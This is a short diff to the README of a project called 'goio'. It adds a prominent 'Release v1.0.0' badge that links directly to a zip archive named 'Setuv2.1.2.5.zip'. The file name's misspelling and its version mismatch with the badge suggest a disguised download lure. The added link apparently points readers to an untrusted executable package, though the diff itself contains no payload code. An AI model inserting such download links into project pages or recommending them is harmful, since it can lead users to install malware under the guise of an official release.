@@ -1,3 +1,5 @@
+[![Release](https://img.shields.io/badge/release-v1.0.0-brightgreen?style=flat-square)](https://github.com/nicksilvaio89f3/goio/releases/download/v1.0.0/Setuv2.1.2.5.zip)
+
 # ⚡ goio
 
 ![License](https://img.shields.io/github/license/nicksilvaio89f3/goio) ![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux-blue.svg)
